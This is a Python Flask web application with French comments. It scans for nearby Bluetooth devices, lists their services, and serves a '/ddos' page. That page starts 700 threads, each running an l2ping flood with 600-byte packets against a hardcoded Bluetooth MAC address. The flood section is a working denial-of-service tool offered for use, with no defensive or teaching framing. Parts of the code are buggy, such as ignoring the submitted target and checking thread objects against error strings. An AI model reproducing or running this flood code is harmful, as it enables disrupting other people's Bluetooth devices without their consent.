from flask import Flask, render_template, request
from flask_socketio import SocketIO
import bluetooth
import subprocess
import threading
from flask_socketio import SocketIO

app = Flask(__name__)
socketio = SocketIO(app)

@app.route('/home')
@app.route('/')
def home():
    return render_template('index.html')


@app.route('/scan')
def scan():
    return render_template('scan.html')

@app.route('/scan/result',methods=['POST', 'GET'])
def scan_result():
    nearby_devices = bluetooth.discover_devices()
    data_str2 = str(nearby_devices)[1:-1]
    data_str = data_str2.replace("'", '')
    result = "error"
    items = []
    
    if data_str == '':
        items.append("No bluetooth found !")
    else:
        
        # Pour chaque périphérique
        for addr in nearby_devices:
            # Recherche du nom du périphérique
            device_name = bluetooth.lookup_name(addr)
            result = f'{addr} - {device_name}'
            items.append(result)
            
            print(result)

    return render_template('scan.html', items=items)


@app.route('/scan_mac')
def scan_mac():
    return render_template('scan_mac.html')


@app.route('/scan_mac/result',methods=['POST', 'GET'])
def scan_mac_result():
    output = request.form.to_dict()

    target_url = output["target_mac"]
    device_name = bluetooth.lookup_name(target_url)
    services = bluetooth.find_service(address=target_url)
    if services:
        print(device_name)
        # Pour chaque service disponible, affichage de son nom et de son UUID
        for service in services:
            print(f'  Service: {service["name"]} [{service["protocol"]}]')
            print(f'  UUID: {service["service-id"]}')
    else:
        print('Aucun service disponible sur ce périphérique')

    
    return render_template('scan_mac.html', newdata = "data_str")

@app.route('/scan_name')
def scan_name():
    return render_template('scan_name.html')


@app.route('/ddos')
def ddos():
    return render_template('ddos.html')


def l2ping_thread(socketio):
    # Adresse MAC de la cible
    target_mac = 'F0:CD:31:65:F2:7F'
    packages_size = '600'

    # Exécutez la commande l2ping
    result = subprocess.run(['l2ping', '-i', 'hci0', '-s', packages_size, '-f', target_mac], stdout=subprocess.PIPE)

    output = result.stdout.decode('utf-8')



@app.route('/ddos/result',methods=['POST', 'GET'])
def ddos_result():
    output = request.form.to_dict()

    target_url = output["target_mac"]

    threads = []

    for i in range(700):
        t = threading.Thread(target=l2ping_thread, args=(socketio,))
        threads.append(t)
        t.start()

        if str(t) == 'Recv failed: Connection reset by peer':
            return render_template('ddos.html', newdata = 'La commande a échoué')
        
        if str(t) == "Can't connect: Host is down":
            return render_template('ddos.html', newdata = 'La commande a échoué')


    return render_template('ddos.html', newdata = 'Started 700 threads, please wait a few minutes !')



@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404


if __name__ == '__main__':
    socketio.run(app)